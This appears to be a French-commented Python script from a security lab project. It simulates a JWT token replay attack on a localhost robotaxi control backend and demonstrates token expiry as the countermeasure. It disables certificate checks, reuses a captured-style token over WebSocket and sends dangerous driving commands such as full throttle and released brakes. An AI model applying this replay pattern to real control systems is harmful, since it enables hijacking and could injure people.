"""
attacks/replay_attack.py — Simulation d'une attaque par rejeu (Replay Attack)

Scénario :
    Un attaquant a intercepté un token JWT valide (via MITM avant activation TLS).
    Il l'utilise pour se connecter au backend et envoyer des commandes malveillantes
    au robotaxi SANS connaître le mot de passe.

Contre-mesure démontrée :
    Le token expire après JWT_EXPIRY_MINUTES (15 min par défaut).
    Pour la démo, mettre JWT_EXPIRY_MINUTES=1 dans docker-compose.yml,
    attendre 1 minute, relancer le script → connexion refusée.

Usage :
    pip install aiohttp websockets
    python attacks/replay_attack.py
"""

import asyncio
import aiohttp
import websockets
import ssl
import json
from datetime import datetime

BACKEND_HTTPS = "https://localhost:8000"
BACKEND_WSS   = "wss://localhost:8000"

# L'attaquant n'a pas notre CA → il désactive la vérification SSL
ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE


async def replay_attack():
    print("=" * 60)
    print("   SIMULATION — REPLAY ATTACK")
    print("=" * 60)

    # ------------------------------------------------------------------
    # ÉTAPE 1 : l'attaquant a intercepté un token (via Wireshark/MITM)
    # ------------------------------------------------------------------
    print("\n[ÉTAPE 1] Récupération du token intercepté...")
    print("          (simule un token capturé via MITM avant TLS)\n")

    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    async with aiohttp.ClientSession(connector=connector) as session:
        async with session.post(
            f"{BACKEND_HTTPS}/auth/login",
            json={"operator_id": "operator_001", "password": "secret123"}
        ) as resp:
            if resp.status != 200:
                print(f"[ERREUR] Login échoué : HTTP {resp.status}")
                return
            data = await resp.json()
            token = data["access_token"]

    print(f"[+] Token obtenu : {token[:60]}...")
    print(f"    (un attaquant l'aurait capturé via Wireshark en ws://)\n")

    # ------------------------------------------------------------------
    # ÉTAPE 2 : attendre l'expiration du token (démo contre-mesure)
    # ------------------------------------------------------------------
    import os
    wait_seconds = int(os.getenv("WAIT_EXPIRY", "0"))
    if wait_seconds > 0:
        print(f"[ÉTAPE 2] Simulation : l'attaquant attend {wait_seconds}s avant de rejouer le token...")
        for remaining in range(wait_seconds, 0, -5):
            print(f"          ⏳ {remaining}s restantes...")
            await asyncio.sleep(5)
        print(f"[!] Token âgé de {wait_seconds}s — tentative de rejeu...\n")
    else:
        print("[ÉTAPE 2] Utilisation immédiate du token intercepté\n")

    # ------------------------------------------------------------------
    # ÉTAPE 3 : connexion WebSocket avec le token volé
    # ------------------------------------------------------------------
    print("[ÉTAPE 3] Connexion WebSocket avec le token volé...")

    try:
        async with websockets.connect(
            f"{BACKEND_WSS}/ws/operator/operator_001?token={token}",
            ssl=ssl_ctx
        ) as ws:
            print("[+] CONNEXION ÉTABLIE — l'attaquant contrôle le véhicule !\n")

            # ------------------------------------------------------------------
            # ÉTAPE 4 : envoi de commandes malveillantes
            # ------------------------------------------------------------------
            print("[ÉTAPE 4] Envoi de commandes malveillantes...\n")

            commandes = [
                {
                    "label": "Accélération maximale",
                    "cmd": {"type": "command", "operator_id": "operator_001",
                            "timestamp": datetime.now().isoformat(),
                            "throttle": 1.0, "steering": 0.0, "brake": 0.0}
                },
                {
                    "label": "Virage brutal à droite (steering=90°)",
                    "cmd": {"type": "command", "operator_id": "operator_001",
                            "timestamp": datetime.now().isoformat(),
                            "throttle": 0.5, "steering": 90.0, "brake": 0.0}
                },
                {
                    "label": "Désactivation des freins à pleine vitesse",
                    "cmd": {"type": "command", "operator_id": "operator_001",
                            "timestamp": datetime.now().isoformat(),
                            "throttle": 0.0, "steering": 0.0, "brake": 0.0}
                },
            ]

            for item in commandes:
                await ws.send(json.dumps(item["cmd"]))
                print(f"  [!] {item['label']}")
                await asyncio.sleep(1.5)

        print("\n[RÉSULTAT] ATTAQUE RÉUSSIE")
        print("           Le véhicule a exécuté toutes les commandes malveillantes.")

    except Exception as e:
        print(f"\n[RÉSULTAT] ATTAQUE ÉCHOUÉE → {e}")
        print("           Le token a expiré ou a été révoqué.")

    # ------------------------------------------------------------------
    # Rappel contre-mesure
    # ------------------------------------------------------------------
    print("\n" + "=" * 60)
    print("CONTRE-MESURE : Expiration JWT")
    print("  → Mettre JWT_EXPIRY_MINUTES=1 dans docker-compose.yml")
    print("  → Attendre 1 minute")
    print("  → Relancer ce script : connexion refusée (token expiré)")
    print("=" * 60)


if __name__ == "__main__":
    asyncio.run(replay_attack())
